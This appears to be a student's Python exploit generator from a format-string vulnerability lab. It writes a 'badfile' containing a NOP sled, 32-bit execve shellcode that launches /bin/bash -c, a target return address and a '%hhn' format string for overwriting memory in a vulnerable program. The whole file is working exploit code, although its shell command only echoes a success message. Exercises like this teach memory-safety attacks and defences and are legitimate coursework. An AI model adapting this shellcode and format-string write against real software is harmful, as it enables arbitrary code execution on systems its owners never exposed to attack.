#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/echo === Success ===                                 *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_32

# Put the shellcode somewhere in the payload
start = 500               # Change this number
content[start:start+len(shellcode)] = shellcode

print(len(shellcode) )
############################################################
#
#    Construct the format string here
# 
# This line shows how to store a 4-byte integer at offset 0
#target_high = 0xffff
#target_low = 0xd370 + 500


number  = 0xffffd148+3
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  = ("@@@@").encode('latin-1')

s = ""
for i in range(50):
	s += str(i) + ":%.8x "

s = "%.127x%7$hhn"
#s += "%."+str(target_1)+"lx%157$n%."+str(target_2-target_1)+"lx%158$hn%."+str(target_3-target_2)+"lx%159$hn"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt
############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
